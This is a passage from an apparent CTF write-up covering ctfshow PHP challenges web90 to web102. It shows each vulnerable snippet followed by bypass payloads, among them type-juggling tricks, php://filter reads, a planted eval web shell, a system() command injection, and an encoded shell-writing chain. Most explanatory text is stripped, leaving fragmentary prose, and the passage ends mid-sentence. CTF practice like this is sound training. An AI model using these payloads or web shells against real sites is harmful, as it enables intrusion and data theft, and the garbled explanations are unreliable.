class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num===&quot;4476&quot;)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo intval($num,0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><code>intval</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intval ( mixed $var [, int $base = 10 ] )</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p> <code>base</code>  0 <code>var</code> </p>\n<ul>\n<li> 0x ( 0X)  16  (hex)</li>\n<li> 0  8 (octal)</li>\n<li> 10  (decimal)</li>\n</ul>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intval(&#x27;4476a&#x27;,0)=4476</span><br><span class=\"line\">intval(&#x27;010574&#x27;,0)=4476</span><br><span class=\"line\">intval(&#x27;0x117c&#x27;,0)=4476</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<h3 id=\"web91\"><a href=\"#web91\" class=\"headerlink\" title=\"web91\"></a>web91</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">$a=$_GET[&#x27;cmd&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class=\"line\">        echo &#x27;hacker&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    echo &#x27;nonononono&#x27;;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p> <code></code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i (ignore)</span><br><span class=\"line\">g (global)</span><br><span class=\"line\">m (more)</span><br><span class=\"line\">s  . </span><br><span class=\"line\">U ;; </span><br><span class=\"line\">//:x ; </span><br><span class=\"line\">//:A ;</span><br><span class=\"line\">//:D $,; </span><br><span class=\"line\">//:e preg_replace(), ;  </span><br></pre></td></tr></table></figure>\n\n<p><code>(preg_match(&#39;/^php$/im&#39;, $a))</code>php</p>\n<p><code>(preg_match(&#39;/^php$/i&#39;, $a))</code>php</p>\n<blockquote>\n<p>preg_match()  preg_match_all() subject </p>\n</blockquote>\n<p><code>%0a</code>enter</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?cmd=%0aphp</span><br><span class=\"line\">?cmd=php%0a1   (php%0a)</span><br></pre></td></tr></table></figure>\n\n<p> <code>%0aphp</code>payload <code>php%0a1</code></p>\n<p><code>^php$</code><code>(preg_match(&#39;/^php$/i&#39;, $a))</code></p>\n<h3 id=\"web92\"><a href=\"#web92\" class=\"headerlink\" title=\"web92\"></a>web92</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num==4476)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)==4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo intval($num,0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>intval()$base0$var ePHP</p>\n</blockquote>\n<p>e0b0x</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=0b1000101111100</span><br><span class=\"line\">?num=0x117c</span><br><span class=\"line\">?num=4476e123</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web93\"><a href=\"#web93\" class=\"headerlink\" title=\"web93\"></a>web93</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num==4476)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)==4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo intval($num,0);</span><br><span class=\"line\">    &#125; </span><br></pre></td></tr></table></figure>\n\n<p>e</p>\n<p>0</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=010574</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web94\"><a href=\"#web94\" class=\"headerlink\" title=\"web94\"></a>web94</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num===&quot;4476&quot;)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>0,if<code>===</code></p>\n<p> <code>4476.0</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=4476.0</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=+010574</span><br><span class=\"line\">?num= 010574//</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web95\"><a href=\"#web95\" class=\"headerlink\" title=\"web95\"></a>web95</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num==4476)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class=\"line\">        die(&quot;no no no!!!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>  <code>+</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num= 010574</span><br><span class=\"line\">?num=+010574</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web96\"><a href=\"#web96\" class=\"headerlink\" title=\"web96\"></a>web96</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;u&#x27;]))&#123;</span><br><span class=\"line\">    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;no no no&quot;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>flag.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?u=./flag.php</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?u=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web97\"><a href=\"#web97\" class=\"headerlink\" title=\"web97\"></a>web97</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class=\"line\">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class=\"line\">if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class=\"line\">echo $flag;</span><br><span class=\"line\">else</span><br><span class=\"line\">print &#x27;Wrong.&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p>postaba!&#x3D;b</p>\n<p><code>md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code></p>\n<blockquote>\n<p>MD5NULL</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web98\"><a href=\"#web98\" class=\"headerlink\" title=\"web98\"></a>web98</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class=\"line\">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;` </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p>GETpostgetflag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>flag&#x3D;flag,COOKIEget,flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;; </span><br></pre></td></tr></table></figure>\n\n<p>flag&#x3D;flag,SERVERget,flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__</span><br></pre></td></tr></table></figure>\n\n<p>HTTP_FLAG&#x3D;flag$flag</p>\n<p>get</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>\n\n<p>GETpostget</p>\n<p>getpost</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=1111</span><br><span class=\"line\"></span><br><span class=\"line\">post:HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>\n\n<p>highlight_file($flag)$flagphp$flag</p>\n<h3 id=\"web99\"><a href=\"#web99\" class=\"headerlink\" title=\"web99\"></a>web99</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$allow = array();</span><br><span class=\"line\">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class=\"line\">    array_push($allow, rand(1,$i));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class=\"line\">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p><code>array_push</code></p>\n<blockquote>\n<p>array_push  </p>\n</blockquote>\n<p><code>in_array</code></p>\n<blockquote>\n<p>i</p>\n</blockquote>\n<p>ncontentn</p>\n<p>1</p>\n<p> 1.php <code>1.php == 1</code></p>\n<p>content</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?n=1.php</span><br><span class=\"line\"></span><br><span class=\"line\">POST:content=&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<h3 id=\"web100\"><a href=\"#web100\" class=\"headerlink\" title=\"web100\"></a>web100</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;ctfshow.php&quot;);</span><br><span class=\"line\">//flag in class ctfshow;</span><br><span class=\"line\">$ctfshow = new ctfshow();</span><br><span class=\"line\">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v0)&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\;/&quot;, $v2))&#123;</span><br><span class=\"line\">        if(preg_match(&quot;/\\;/&quot;, $v3))&#123;</span><br><span class=\"line\">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>is_numeric</code></p>\n<blockquote>\n<p> </p>\n</blockquote>\n<p></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;&amp; --&gt; || --&gt; = --&gt; and --&gt; or</span><br></pre></td></tr></table></figure>\n\n<p>and</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$v0=is_numeric($v1)</span><br></pre></td></tr></table></figure>\n\n<p>v1v2,v3</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>  <code>flag in class ctfshow; </code></p>\n<p><code>||</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v2=system(&quot;cat ctfshow.php&quot;)||&amp;v3=;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web101\"><a href=\"#web101\" class=\"headerlink\" title=\"web101\"></a>web101</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;ctfshow.php&quot;);</span><br><span class=\"line\">//flag in class ctfshow;</span><br><span class=\"line\">$ctfshow = new ctfshow();</span><br><span class=\"line\">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v0)&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123;</span><br><span class=\"line\">        if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123;</span><br><span class=\"line\">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); </span><br></pre></td></tr></table></figure>\n\n<p>wp</p>\n<p><code>ReflectionClasss</code></p>\n<blockquote>\n<p>ReflectionClass</p>\n<p>ReflectionClassPHP5Reflector<br>PHPnew ReflectionClass(system(cmd))</p>\n</blockquote>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>\n\n<p> 0x2d -  35</p>\n<h3 id=\"web102\"><a href=\"#web102\" class=\"headerlink\" title=\"web102\"></a>web102</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v4)&#123;</span><br><span class=\"line\">    $s = substr($v2,2);</span><br><span class=\"line\">    $str = call_user_func($v1,$s);</span><br><span class=\"line\">    echo $str;</span><br><span class=\"line\">    file_put_contents($v3,$str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    die(&#x27;hacker&#x27;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>substr</code></p>\n<blockquote>\n<p><strong>substr</strong> ( string <code>$string</code> , int <code>$start</code> [, int <code>$length</code> ] ) : string</p>\n<p> <code>string</code>  <code>start</code>  <code>length</code> </p>\n</blockquote>\n<p> <code>$s = substr($v2,2);</code>v2[2:],</p>\n<p><code>call_user_func</code></p>\n<blockquote>\n<p><strong>call_user_func</strong> ( <a href=\"php/language.types.callable.html\">callable</a> <code>$callback</code> [, <a href=\"php/language.pseudo-types.html#language.types.mixed\">mixed</a> <code>$parameter</code> [, <a href=\"php/language.pseudo-types.html#language.types.mixed\">mixed</a> <code>$...</code> ]] ) : <a href=\"php/language.pseudo-types.html#language.types.mixed\">mixed</a></p>\n<p> <code>callback</code> </p>\n</blockquote>\n<p>v1v3v2shell</p>\n<p>wp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`tac *`;  </span><br></pre></td></tr></table></figure>\n\n<p>hex3c3f3d60746163202a603b <br>base64</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PD89YHRhYyAqYDs= //hex</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5044383959485268597941715944733d</span><br></pre></td></tr></table></figure>\n\n<p> <code>3d</code></p>\n<p>v1&#x3D;hex2bin  